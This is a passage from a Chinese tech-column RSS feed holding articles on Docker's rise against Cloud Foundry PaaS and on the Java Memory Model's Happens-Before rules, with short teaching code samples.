&lt;p>所以，我和一些人开玩笑说，&lt;strong>我们可能都是在写一样的 for(int i=0; i&amp;lt;n; i++) 语句，但是，你写在那个地方一文不值，而我写在这个地方，这行代码就值 2000 元&lt;/strong>。不要误会，我只是想用这种&amp;quot;鲜明的对比方式&amp;quot;来加强我的观点。&lt;/p>
&lt;p>上面就是我这 20 年来的经历。相信这类经历你也有过，或者你正在经历中，欢迎你也分享一下自己的经历和心得。&lt;/p>
&lt;p>那么，怎样能让自己的技术被尊重？如何通过技术和技能赚钱？下一篇文章中，我将对此做一些总结，希望对你有帮助。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/fc/e9/fcc761001867c60f526665e237f831e9.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 01丨预习篇·小鲸鱼大事记（一）：初出茅庐</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-kubernetes/01%E4%B8%A8%E9%A2%84%E4%B9%A0%E7%AF%87%E5%B0%8F%E9%B2%B8%E9%B1%BC%E5%A4%A7%E4%BA%8B%E8%AE%B0%E4%B8%80%E5%88%9D%E5%87%BA%E8%8C%85%E5%BA%90/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-kubernetes/01%E4%B8%A8%E9%A2%84%E4%B9%A0%E7%AF%87%E5%B0%8F%E9%B2%B8%E9%B1%BC%E5%A4%A7%E4%BA%8B%E8%AE%B0%E4%B8%80%E5%88%9D%E5%87%BA%E8%8C%85%E5%BA%90/</guid><description>
&lt;p>你好，我是张磊。我今天分享的主题是：小鲸鱼大事记之初出茅庐。&lt;/p>
&lt;p>&lt;strong>如果我问你，现今最热门的服务器端技术是什么？想必你不假思索就能回答上来：当然是容器！可是，如果现在不是 2018 年而是 2013 年，你的回答还能这么斩钉截铁么？&lt;/strong>&lt;/p>
&lt;p>现在就让我们把时间拨回到五年前去看看吧。&lt;/p>
&lt;p>2013 年的后端技术领域，已经太久没有出现过令人兴奋的东西了。曾经被人们寄予厚望的云计算技术，也已经从当初虚无缥缈的概念蜕变成了实实在在的虚拟机和账单。而相比于的如日中天 AWS 和盛极一时的 OpenStack，以 Cloud Foundry 为代表的开源 PaaS 项目，却成为了当时云计算技术中的一股清流。&lt;/p>
&lt;p>这时，Cloud Foundry 项目已经基本度过了最艰难的概念普及和用户教育阶段，吸引了包括百度、京东、华为、IBM 等一大批国内外技术厂商，开启了以开源 PaaS 为核心构建平台层服务能力的变革。如果你有机会问问当时的云计算从业者们，他们十有八九都会告诉你：PaaS 的时代就要来了！&lt;/p>
&lt;p>这个说法其实一点儿没错，如果不是后来一个叫 Docker 的开源项目突然冒出来的话。&lt;/p>
&lt;p>事实上，当时还名叫 dotCloud 的 Docker 公司，也是这股 PaaS 热潮中的一份子。只不过相比于 Heroku、Pivotal、Red Hat 等 PaaS 弄潮儿们，dotCloud 公司实在是太微不足道了，而它的主打产品由于跟主流的 Cloud Foundry 社区脱节，长期以来也无人问津。眼看就要被如火如荼的 PaaS 风潮抛弃，dotCloud 公司却做出了这样一个决定：开源自己的容器项目 Docker。&lt;/p>
&lt;p>显然，这个决定在当时根本没人在乎。&lt;/p>
&lt;p>&amp;ldquo;容器&amp;quot;这个概念从来就不是什么新鲜的东西，也不是 Docker 公司发明的。即使在当时最热门的 PaaS 项目 Cloud Foundry 中，容器也只是其最底层、最没人关注的那一部分。说到这里，我正好以当时的事实标准 Cloud Foundry 为例，来解说一下 PaaS 技术。&lt;/p>
&lt;p>&lt;strong>PaaS 项目被大家接纳的一个主要原因，就是它提供了一种名叫&amp;quot;应用托管&amp;quot;的能力。&lt;/strong> 在当时，虚拟机和云计算已经是比较普遍的技术和服务了，那时主流用户的普遍用法，就是租一批 AWS 或者 OpenStack 的虚拟机，然后像以前管理物理服务器那样，用脚本或者手工的方式在这些机器上部署应用。&lt;/p>
&lt;p>当然，这个部署过程难免会碰到云端虚拟机和本地环境不一致的问题，所以当时的云计算服务，比的就是谁能更好地模拟本地服务器环境，能带来更好的&amp;quot;上云&amp;quot;体验。而 PaaS 开源项目的出现，就是当时解决这个问题的一个最佳方案。&lt;/p>
&lt;p>举个例子，虚拟机创建好之后，运维人员只需要在这些机器上部署一个 Cloud Foundry 项目，然后开发者只要执行一条命令就能把本地的应用部署到云上，这条命令就是：&lt;/p>
&lt;pre>&lt;code>$ cf push &amp;quot; 我的应用 &amp;quot;
&lt;/code>&lt;/pre>
&lt;p>是不是很神奇？&lt;/p>
&lt;p>事实上，&lt;strong>像 Cloud Foundry 这样的 PaaS 项目，最核心的组件就是一套应用的打包和分发机制。&lt;/strong> Cloud Foundry 为每种主流编程语言都定义了一种打包格式，而&amp;quot;cf push&amp;quot;的作用，基本上等同于用户把应用的可执行文件和启动脚本打进一个压缩包内，上传到云上 Cloud Foundry 的存储中。接着，Cloud Foundry 会通过调度器选择一个可以运行这个应用的虚拟机，然后通知这个机器上的 Agent 把应用压缩包下载下来启动。&lt;/p>
&lt;p>这时候关键来了，由于需要在一个虚拟机上启动很多个来自不同用户的应用，Cloud Foundry 会调用操作系统的 Cgroups 和 Namespace 机制为每一个应用单独创建一个称作&amp;quot;沙盒&amp;quot;的隔离环境，然后在&amp;quot;沙盒&amp;quot;中启动这些应用进程。这样，就实现了把多个用户的应用互不干涉地在虚拟机里批量地、自动地运行起来的目的。&lt;/p>
&lt;p>&lt;strong>这，正是 PaaS 项目最核心的能力。&lt;/strong> 而这些 Cloud Foundry 用来运行应用的隔离环境，或者说&amp;quot;沙盒&amp;rdquo;，就是所谓的&amp;quot;容器&amp;quot;。&lt;/p>
&lt;p>而 Docker 项目，实际上跟 Cloud Foundry 的容器并没有太大不同，所以在它发布后不久，Cloud Foundry 的首席产品经理 James Bayer 就在社区里做了一次详细对比，告诉用户 Docker 实际上只是一个同样使用 Cgroups 和 Namespace 实现的&amp;quot;沙盒&amp;quot;而已，没有什么特别的黑科技，也不需要特别关注。&lt;/p>
&lt;p>然而，短短几个月，Docker 项目就迅速崛起了。它的崛起速度如此之快，以至于 Cloud Foundry 以及所有的 PaaS 社区还没来得及成为它的竞争对手，就直接被宣告出局了。那时候，一位多年的 PaaS 从业者曾经如此感慨道：这简直就是一场&amp;quot;降维打击&amp;quot;啊。&lt;/p>
&lt;p>难道这一次，连闯荡多年的&amp;quot;老江湖&amp;quot;James Bayer 也看走眼了么？&lt;/p>
&lt;p>并没有。&lt;/p>
&lt;p>事实上，Docker 项目确实与 Cloud Foundry 的容器在大部分功能和实现原理上都是一样的，可偏偏就是这剩下的一小部分不一样的功能，成了 Docker 项目接下来&amp;quot;呼风唤雨&amp;quot;的不二法宝。&lt;/p>
&lt;p>&lt;strong>这个功能，就是 Docker 镜像。&lt;/strong>&lt;/p>
&lt;p>恐怕连 Docker 项目的作者 Solomon Hykes 自己当时都没想到，这个小小的创新，在短短几年内就如此迅速地改变了整个云计算领域的发展历程。&lt;/p>
&lt;p>我前面已经介绍过，PaaS 之所以能够帮助用户大规模部署应用到集群里，是因为它提供了一套应用打包的功能。可偏偏就是这个打包功能，却成了 PaaS 日后不断遭到用户诟病的一个&amp;quot;软肋&amp;quot;。&lt;/p>
&lt;p>出现这个问题的根本原因是，一旦用上了 PaaS，用户就必须为每种语言、每种框架，甚至每个版本的应用维护一个打好的包。这个打包过程，没有任何章法可循，更麻烦的是，明明在本地运行得好好的应用，却需要做很多修改和配置工作才能在 PaaS 里运行起来。而这些修改和配置，并没有什么经验可以借鉴，基本上得靠不断试错，直到你摸清楚了本地应用和远端 PaaS 匹配的&amp;quot;脾气&amp;quot;才能够搞定。&lt;/p>
&lt;p>最后结局就是，&amp;ldquo;cf push&amp;quot;确实是能一键部署了，但是为了实现这个一键部署，用户为每个应用打包的工作可谓一波三折，费尽心机。&lt;/p>
&lt;p>而&lt;strong>Docker 镜像解决的，恰恰就是打包这个根本性的问题。&lt;/strong> 所谓 Docker 镜像，其实就是一个压缩包。但是这个压缩包里的内容，比 PaaS 的应用可执行文件 + 启停脚本的组合就要丰富多了。实际上，大多数 Docker 镜像是直接由一个完整操作系统的所有文件和目录构成的，所以这个压缩包里的内容跟你本地开发和测试环境用的操作系统是完全一样的。&lt;/p>
&lt;p>这就有意思了：假设你的应用在本地运行时，能看见的环境是 CentOS 7.2 操作系统的所有文件和目录，那么只要用 CentOS 7.2 的 ISO 做一个压缩包，再把你的应用可执行文件也压缩进去，那么无论在哪里解压这个压缩包，都可以得到与你本地测试时一样的环境。当然，你的应用也在里面！&lt;/p>
&lt;p>这就是 Docker 镜像最厉害的地方：只要有这个压缩包在手，你就可以使用某种技术创建一个&amp;quot;沙盒&amp;rdquo;，在&amp;quot;沙盒&amp;quot;中解压这个压缩包，然后就可以运行你的程序了。&lt;/p>
&lt;p>更重要的是，这个压缩包包含了完整的操作系统文件和目录，也就是包含了这个应用运行所需要的所有依赖，所以你可以先用这个压缩包在本地进行开发和测试，完成之后，再把这个压缩包上传到云端运行。&lt;/p>
&lt;p>在这个过程中，你完全不需要进行任何配置或者修改，因为这个压缩包赋予了你一种极其宝贵的能力：本地环境和云端环境的高度一致！&lt;/p>
&lt;p>这，&lt;strong>正是 Docker 镜像的精髓。&lt;/strong>&lt;/p>
&lt;p>那么，有了 Docker 镜像这个利器，PaaS 里最核心的打包系统一下子就没了用武之地，最让用户抓狂的打包过程也随之消失了。相比之下，在当今的互联网里，Docker 镜像需要的操作系统文件和目录，可谓唾手可得。&lt;/p>
&lt;p>所以，你只需要提供一个下载好的操作系统文件与目录，然后使用它制作一个压缩包即可，这个命令就是：&lt;/p>
&lt;pre>&lt;code>$ docker build &amp;quot; 我的镜像 &amp;quot;
&lt;/code>&lt;/pre>
&lt;p>一旦镜像制作完成，用户就可以让 Docker 创建一个&amp;quot;沙盒&amp;quot;来解压这个镜像，然后在&amp;quot;沙盒&amp;quot;中运行自己的应用，这个命令就是：&lt;/p>
&lt;pre>&lt;code>$ docker run &amp;quot; 我的镜像 &amp;quot;
&lt;/code>&lt;/pre>
&lt;p>当然，docker run 创建的&amp;quot;沙盒&amp;quot;，也是使用 Cgroups 和 Namespace 机制创建出来的隔离环境。我会在后面的文章中，详细介绍这个机制的实现原理。&lt;/p>
&lt;p>所以，&lt;strong>Docker 项目给 PaaS 世界带来的&amp;quot;降维打击&amp;quot;，其实是提供了一种非常便利的打包机制。这种机制直接打包了应用运行所需要的整个操作系统，从而保证了本地环境和云端环境的高度一致，避免了用户通过&amp;quot;试错&amp;quot;来匹配两种不同运行环境之间差异的痛苦过程。&lt;/strong>&lt;/p>
&lt;p>而对于开发者们来说，在终于体验到了生产力解放所带来的痛快之后，他们自然选择了用脚投票，直接宣告了 PaaS 时代的结束。&lt;/p>
&lt;p>不过，Docker 项目固然解决了应用打包的难题，但正如前面所介绍的那样，它并不能代替 PaaS 完成大规模部署应用的职责。&lt;/p>
&lt;p>遗憾的是，考虑到 Docker 公司是一个与自己有潜在竞争关系的商业实体，再加上对 Docker 项目普及程度的错误判断，Cloud Foundry 项目并没有第一时间使用 Docker 作为自己的核心依赖，去替换自己那套饱受诟病的打包流程。&lt;/p>
&lt;p>反倒是一些机敏的创业公司，纷纷在第一时间推出了 Docker 容器集群管理的开源项目（比如 Deis 和 Flynn），它们一般称自己为 CaaS，即 Container-as-a-Service，用来跟&amp;quot;过时&amp;quot;的 PaaS 们划清界限。&lt;/p>
&lt;p>而在 2014 年底的 DockerCon 上，Docker 公司雄心勃勃地对外发布了自家研发的&amp;quot;Docker 原生&amp;quot;容器集群管理项目 Swarm，不仅将这波&amp;quot;CaaS&amp;quot;热推向了一个前所未有的高潮，更是寄托了整个 Docker 公司重新定义 PaaS 的宏伟愿望。&lt;/p>
&lt;p>在 2014 年的这段巅峰岁月里，Docker 公司离自己的理想真的只有一步之遥。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>2013~2014 年，以 Cloud Foundry 为代表的 PaaS 项目，逐渐完成了教育用户和开拓市场的艰巨任务，也正是在这个将概念逐渐落地的过程中，应用&amp;quot;打包&amp;quot;困难这个问题，成了整个后端技术圈子的一块心病。&lt;/p>
&lt;p>Docker 项目的出现，则为这个根本性的问题提供了一个近乎完美的解决方案。这正是 Docker 项目刚刚开源不久，就能够带领一家原本默默无闻的 PaaS 创业公司脱颖而出，然后迅速占领了所有云计算领域头条的技术原因。&lt;/p>
&lt;p>而在成为了基础设施领域近十年难得一见的技术明星之后，dotCloud 公司则在 2013 年底大胆改名为 Docker 公司。不过，这个在当时就颇具争议的改名举动，也成为了日后容器技术圈风云变幻的一个关键伏笔。&lt;/p>
&lt;h2 id="思考题">思考题&lt;/h2>
&lt;p>你是否曾经研发过类似 PaaS 的项目？你碰到过应用打包的问题吗，又是如何解决的呢？&lt;/p>
&lt;p>感谢收听，欢迎你给我留言，也欢迎分享给更多的朋友一起阅读。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/47/55/47a6f3bf6b92d58512d5a2ed0a556f55.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 02丨Java内存模型：看Java如何解决可见性和有序性问题</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/02%E4%B8%A8java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%9C%8Bjava%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%8F%AF%E8%A7%81%E6%80%A7%E5%92%8C%E6%9C%89%E5%BA%8F%E6%80%A7%E9%97%AE%E9%A2%98/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/02%E4%B8%A8java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E7%9C%8Bjava%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E5%8F%AF%E8%A7%81%E6%80%A7%E5%92%8C%E6%9C%89%E5%BA%8F%E6%80%A7%E9%97%AE%E9%A2%98/</guid><description>
&lt;p>上一期我们讲到在并发场景中，因可见性、原子性、有序性导致的问题常常会违背我们的直觉，从而成为并发编程的 Bug 之源。这三者在编程领域属于共性问题，所有的编程语言都会遇到，Java 在诞生之初就支持多线程，自然也有针对这三者的技术方案，而且在编程语言领域处于领先地位。理解 Java 解决并发问题的解决方案，对于理解其他语言的解决方案有触类旁通的效果。&lt;/p>
&lt;p>那我们就先来聊聊如何解决其中的可见性和有序性导致的问题，这也就引出来了今天的主角&amp;mdash;&amp;mdash;&lt;strong>Java 内存模型&lt;/strong>。&lt;/p>
&lt;p>Java 内存模型这个概念，在职场的很多面试中都会考核到，是一个热门的考点，也是一个人并发水平的具体体现。原因是当并发程序出问题时，需要一行一行地检查代码，这个时候，只有掌握 Java 内存模型，才能慧眼如炬地发现问题。&lt;/p>
&lt;h2 id="什么是-java-内存模型">什么是 Java 内存模型？&lt;/h2>
&lt;p>你已经知道，导致可见性的原因是缓存，导致有序性的原因是编译优化，那解决可见性、有序性最直接的办法就是&lt;strong>禁用缓存和编译优化&lt;/strong>，但是这样问题虽然解决了，我们程序的性能可就堪忧了。&lt;/p>
&lt;p>合理的方案应该是&lt;strong>按需禁用缓存以及编译优化&lt;/strong>。那么，如何做到&amp;quot;按需禁用&amp;quot;呢？对于并发程序，何时禁用缓存以及编译优化只有程序员知道，那所谓&amp;quot;按需禁用&amp;quot;其实就是指按照程序员的要求来禁用。所以，为了解决可见性和有序性问题，只需要提供给程序员按需禁用缓存和编译优化的方法即可。&lt;/p>
&lt;p>Java 内存模型是个很复杂的规范，可以从不同的视角来解读，站在我们这些程序员的视角，本质上可以理解为，Java 内存模型规范了 JVM 如何提供按需禁用缓存和编译优化的方法。具体来说，这些方法包括 &lt;strong>volatile&lt;/strong> 、&lt;strong>synchronized&lt;/strong> 和 &lt;strong>final&lt;/strong> 三个关键字，以及六项 &lt;strong>Happens-Before 规则&lt;/strong>，这也正是本期的重点内容。&lt;/p>
&lt;h2 id="使用-volatile-的困惑">使用 volatile 的困惑&lt;/h2>
&lt;p>volatile 关键字并不是 Java 语言的特产，古老的 C 语言里也有，它最原始的意义就是禁用 CPU 缓存。&lt;/p>
&lt;p>例如，我们声明一个 volatile 变量 &lt;code>volatile int x = 0&lt;/code>，它表达的是：告诉编译器，对这个变量的读写，不能使用 CPU 缓存，必须从内存中读取或者写入。这个语义看上去相当明确，但是在实际使用的时候却会带来困惑。&lt;/p>
&lt;p>例如下面的示例代码，假设线程 A 执行 writer() 方法，按照 volatile 语义，会把变量 &amp;ldquo;v=true&amp;rdquo; 写入内存；假设线程 B 执行 reader() 方法，同样按照 volatile 语义，线程 B 会从内存中读取变量 v，如果线程 B 看到 &amp;ldquo;v == true&amp;rdquo; 时，那么线程 B 看到的变量 x 是多少呢？&lt;/p>
&lt;p>直觉上看，应该是 42，那实际应该是多少呢？这个要看 Java 的版本，如果在低于 1.5 版本上运行，x 可能是 42，也有可能是 0；如果在 1.5 以上的版本上运行，x 就是等于 42。&lt;/p>
&lt;pre>&lt;code>// 以下代码来源于【参考 1】
class VolatileExample {
int x = 0;
volatile boolean v = false;
public void writer() {
x = 42;
v = true;
}
public void reader() {
if (v == true) {
// 这里 x 会是多少呢？
}
}
}
&lt;/code>&lt;/pre>
&lt;p>分析一下，为什么 1.5 以前的版本会出现 x = 0 的情况呢？我相信你一定想到了，变量 x 可能被 CPU 缓存而导致可见性问题。这个问题在 1.5 版本已经被圆满解决了。Java 内存模型在 1.5 版本对 volatile 语义进行了增强。怎么增强的呢？答案是一项 Happens-Before 规则。&lt;/p>
&lt;h2 id="happens-before-规则">Happens-Before 规则&lt;/h2>
&lt;p>如何理解 Happens-Before 呢？如果望文生义（很多网文也都爱按字面意思翻译成&amp;quot;先行发生&amp;quot;），那就南辕北辙了，Happens-Before 并不是说前面一个操作发生在后续操作的前面，它真正要表达的是：&lt;strong>前面一个操作的结果对后续操作是可见的&lt;/strong>。就像有心灵感应的两个人，虽然远隔千里，一个人心之所想，另一个人都看得到。Happens-Before 规则就是要保证线程之间的这种&amp;quot;心灵感应&amp;quot;。所以比较正式的说法是：Happens-Before 约束了编译器的优化行为，虽允许编译器优化，但是要求编译器优化后一定遵守 Happens-Before 规则。&lt;/p>
&lt;p>Happens-Before 规则应该是 Java 内存模型里面最晦涩的内容了，和程序员相关的规则一共有如下六项，都是关于可见性的。&lt;/p>
&lt;p>恰好前面示例代码涉及到这六项规则中的前三项，为便于你理解，我也会分析上面的示例代码，来看看规则 1、2 和 3 到底该如何理解。至于其他三项，我也会结合其他例子作以说明。&lt;/p>
&lt;h3 id="1-程序的顺序性规则">1. 程序的顺序性规则&lt;/h3>
&lt;p>这条规则是指在一个线程中，按照程序顺序，前面的操作 Happens-Before 于后续的任意操作。这还是比较容易理解的，比如刚才那段示例代码，按照程序的顺序，第 6 行代码 &amp;ldquo;x = 42;&amp;rdquo; Happens-Before 于第 7 行代码 &amp;ldquo;v = true;&amp;quot;，这就是规则 1 的内容，也比较符合单线程里面的思维：程序前面对某个变量的修改一定是对后续操作可见的。&lt;/p>
&lt;p>（为方便你查看，我将那段示例代码在这儿再呈现一遍）&lt;/p>
&lt;pre>&lt;code>// 以下代码来源于【参考 1】
class VolatileExample {
int x = 0;
volatile boolean v = false;
public void writer() {
x = 42;
v = true;
}
public void reader() {
if (v == true) {
// 这里 x 会是多少呢？
}
}
}
&lt;/code>&lt;/pre>
&lt;h3 id="2-volatile-变量规则">2. volatile 变量规则&lt;/h3>
&lt;p>这条规则是指对一个 volatile 变量的写操作， Happens-Before 于后续对这个 volatile 变量的读操作。&lt;/p>
&lt;p>这个就有点费解了，对一个 volatile 变量的写操作相对于后续对这个 volatile 变量的读操作可见，这怎么看都是禁用缓存的意思啊，貌似和 1.5 版本以前的语义没有变化啊？如果单看这个规则，的确是这样，但是如果我们关联一下规则 3，就有点不一样的感觉了。&lt;/p>
&lt;h3 id="3-传递性">3. 传递性&lt;/h3>
&lt;p>这条规则是指如果 A Happens-Before B，且 B Happens-Before C，那么 A Happens-Before C。&lt;/p>
&lt;p>我们将规则 3 的传递性应用到我们的例子中，会发生什么呢？可以看下面这幅图：&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/b1/e1/b1fa541e98c74bc2a033d9ac5ae7fbe1.png" alt="">
示例代码中的传递性规则&lt;/p>
&lt;p>从图中，我们可以看到：&lt;/p>
&lt;ol>
&lt;li>&amp;ldquo;x=42&amp;rdquo; Happens-Before 写变量 &amp;ldquo;v=true&amp;rdquo; ，这是规则 1 的内容；&lt;/li>
&lt;li>写变量&amp;quot;v=true&amp;rdquo; Happens-Before 读变量 &amp;ldquo;v=true&amp;rdquo;，这是规则 2 的内容 。&lt;/li>
&lt;/ol>
&lt;p>再根据这个传递性规则，我们得到结果：&amp;ldquo;x=42&amp;rdquo; Happens-Before 读变量&amp;quot;v=true&amp;quot;。这意味着什么呢？&lt;/p>
&lt;p>如果线程 B 读到了&amp;quot;v=true&amp;quot;，那么线程 A 设置的&amp;quot;x=42&amp;quot;对线程 B 是可见的。也就是说，线程 B 能看到 &amp;ldquo;x == 42&amp;rdquo; ，有没有一种恍然大悟的感觉？这就是 1.5 版本对 volatile 语义的增强，这个增强意义重大，1.5 版本的并发工具包（java.util.concurrent）就是靠 volatile 语义来搞定可见性的，这个在后面的内容中会详细介绍。&lt;/p>
&lt;h3 id="4-管程中锁的规则">4. 管程中锁的规则&lt;/h3>
&lt;p>这条规则是指对一个锁的解锁 Happens-Before 于后续对这个锁的加锁。&lt;/p>
&lt;p>要理解这个规则，就首先要了解&amp;quot;管程指的是什么&amp;quot;。&lt;strong>管程&lt;/strong>是一种通用的同步原语，在 Java 中指的就是 synchronized，synchronized 是 Java 里对管程的实现。&lt;/p>
&lt;p>管程中的锁在 Java 里是隐式实现的，例如下面的代码，在进入同步块之前，会自动加锁，而在代码块执行完会自动释放锁，加锁以及释放锁都是编译器帮我们实现的。&lt;/p>
&lt;pre>&lt;code>synchronized (this) { // 此处自动加锁
// x 是共享变量, 初始值 =10
if (this.x &amp;lt; 12) {
this.x = 12;
}
} // 此处自动解锁
&lt;/code>&lt;/pre>
&lt;p>所以结合规则 4&amp;mdash;&amp;mdash;管程中锁的规则，可以这样理解：假设 x 的初始值是 10，线程 A 执行完代码块后 x 的值会变成 12（执行完自动释放锁），线程 B 进入代码块时，能够看到线程 A 对 x 的写操作，也就是线程 B 能够看到 x==12。这个也是符合我们直觉的，应该不难理解。&lt;/p>
&lt;h3 id="5-线程-start-规则">5. 线程 start() 规则&lt;/h3>
&lt;p>这条是关于线程启动的。它是指主线程 A 启动子线程 B 后，子线程 B 能够看到主线程在启动子线程 B 前的操作。&lt;/p>
&lt;p>换句话说就是，如果线程 A 调用线程 B 的 start() 方法（即在线程 A 中启动线程 B），那么该 start() 操作 Happens-Before 于线程 B 中的任意操作。具体可参考下面示例代码。&lt;/p>
&lt;pre>&lt;code>Thread B = new Thread(()-&amp;gt;{
// 主线程调用 B.start() 之前
// 所有对共享变量的修改，此处皆可见
// 此例中，var==77
});
// 此处对共享变量 var 修改
var = 77;
// 主线程启动子线程
B.start();
&lt;/code>&lt;/pre>
&lt;h3 id="6-线程-join-规则">6. 线程 join() 规则&lt;/h3>
&lt;p>这条是关于线程等待的。它是指主线程 A 等待子线程 B 完成（主线程 A 通过调用子线程 B 的 join() 方法实现），当子线程 B 完成后（主线程 A 中 join() 方法返回），主线程能够看到子线程的操作。当然所谓的&amp;quot;看到&amp;quot;，指的是对&lt;strong>共享变量&lt;/strong>的操作。&lt;/p>
&lt;p>换句话说就是，如果在线程 A 中，调用线程 B 的 join() 并成功返回，那么线程 B 中的任意操作 Happens-Before 于该 join() 操作的返回。具体可参考下面示例代码。&lt;/p>
&lt;pre>&lt;code>Thread B = new Thread(()-&amp;gt;{
// 此处对共享变量 var 修改
var = 66;
});
// 例如此处对共享变量修改，
// 则这个修改结果对线程 B 可见
// 主线程启动子线程
B.start();
B.join()
// 子线程所有对共享变量的修改
// 在主线程调用 B.join() 之后皆可见
// 此例中，var==66
&lt;/code>&lt;/pre>
&lt;h2 id="被我们忽视的-final">被我们忽视的 final&lt;/h2>
&lt;p>前面我们讲 volatile 为的是禁用缓存以及编译优化，我们再从另外一个方面来看，有没有办法告诉编译器优化得更好一点呢？这个可以有，就是&lt;strong>final 关键字&lt;/strong>。&lt;/p>
&lt;p>**final 修饰变量时，初衷是告诉编译器：这个变量生而不变，可以可劲儿优化。**Java 编译器在 1.5 以前的版本的确优化得很努力，以至于都优化错了。&lt;/p>
&lt;p>问题类似于上一期提到的利用双重检查方法创建单例，构造函数的错误重排导致线程可能看到 final 变量的值会变化。详细的案例可以参考&lt;a href="http://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html#finalWrong">这个文档&lt;/a>。&lt;/p>
&lt;p>当然了，在 1.5 以后 Java 内存模型对 final 类型变量的重排进行了约束。现在只要我们提供正确构造函数没有&amp;quot;逸出&amp;quot;，就不会出问题了。&lt;/p>
&lt;p>&amp;ldquo;逸出&amp;quot;有点抽象，我们还是举个例子吧，在下面例子中，在构造函数里面将 this 赋值给了全局变量 global.obj，这就是&amp;quot;逸出&amp;rdquo;，线程通过 global.obj 读取 x 是有可能读到 0 的。因此我们一定要避免&amp;quot;逸出&amp;quot;。&lt;/p>
&lt;pre>&lt;code>// 以下代码来源于【参考 1】
final int x;
// 错误的构造函数
public FinalFieldExample() {
x = 3;
y = 4;
// 此处就是讲 this 逸出，
global.obj = this;
}
&lt;/code>&lt;/pre>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>Java 的内存模型是并发编程领域的一次重要创新，之后 C++、C#、Golang 等高级语言都开始支持内存模型。Java 内存模型里面，最晦涩的部分就是 Happens-Before 规则了，Happens-Before 规则最初是在一篇叫做&lt;strong>Time, Clocks, and the Ordering of Events in a Distributed System&lt;/strong>的论文中提出来的，在这篇论文中，Happens-Before 的语义是一种因果关系。在现实世界里，如果 A 事件是导致 B 事件的起因，那么 A 事件一定是先于（Happens-Before）B 事件发生的，这个就是 Happens-Before 语义的现实理解。&lt;/p>
&lt;p>在 Java 语言里面，Happens-Before 的语义本质上是一种可见性，A Happens-Before B 意味着 A 事件对 B 事件来说是可见的，无论 A 事件和 B 事件是否发生在同一个线程里。例如 A 事件发生在线程 1 上，B 事件发生在线程 2 上，Happens-Before 规则保证线程 2 上也能看到 A 事件的发生。&lt;/p>
&lt;p>Java 内存模型主要分为两部分，一部分面向你我这种编写并发程序的应用开发人员，另一部分是面向 JVM 的实现人员的，我们可以重点关注前者，也就是和编写并发程序相关的部分，这部分内容的核心就是 Happens-Before 规则。相信经过本章的介绍，你应该对这部分内容已经有了深入的认识。&lt;/p>
&lt;h2 id="课后思考">课后思考&lt;/h2>
&lt;p>有一个共享变量 abc，在一个线程里设置了 abc 的值 &lt;code>abc=3&lt;/code>，你思考一下，有哪些办法可以让其他线程能够看到&lt;code>abc==3&lt;/code>？&lt;/p>
&lt;p>欢迎在留言区与我分享你的想法，也欢迎你在留言区记录你的思考过程。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。&lt;/p>
&lt;h2 id="参考">参考&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="http://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html">JSR 133 (Java Memory Model) FAQ&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://ifeve.com/jmm-faq/">Java 内存模型 FAQ&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.cs.umd.edu/~pugh/java/memoryModel/jsr133.pdf">JSR-133: Java^TM^ Memory Model and Thread Specification&lt;/a>&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/cf/aa/cf393cd748a4f0e6451807c4b61843aa.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 02丨代码加锁：不要让“锁”事成为烦心事</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E4%B8%9A%E5%8A%A1%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF100%E4%BE%8B/02%E4%B8%A8%E4%BB%A3%E7%A0%81%E5%8A%A0%E9%94%81%E4%B8%8D%E8%A6%81%E8%AE%A9%E9%94%81%E4%BA%8B%E6%88%90%E4%B8%BA%E7%83%A6%E5%BF%83%E4%BA%8B/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E4%B8%9A%E5%8A%A1%E5%BC%80%E5%8F%91%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF100%E4%BE%8B/02%E4%B8%A8%E4%BB%A3%E7%A0%81%E5%8A%A0%E9%94%81%E4%B8%8D%E8%A6%81%E8%AE%A9%E9%94%81%E4%BA%8B%E6%88%90%E4%B8%BA%E7%83%A6%E5%BF%83%E4%BA%8B/</guid><description>
&lt;p>你好，我是朱晔。&lt;/p>
&lt;p>在上一讲中，我与你介绍了使用并发容器等工具解决线程安全的误区。今天，我们来看看解决线程安全问题的另一种重要手段&amp;mdash;&amp;mdash;锁，在使用上比较容易犯哪些错。&lt;/p>
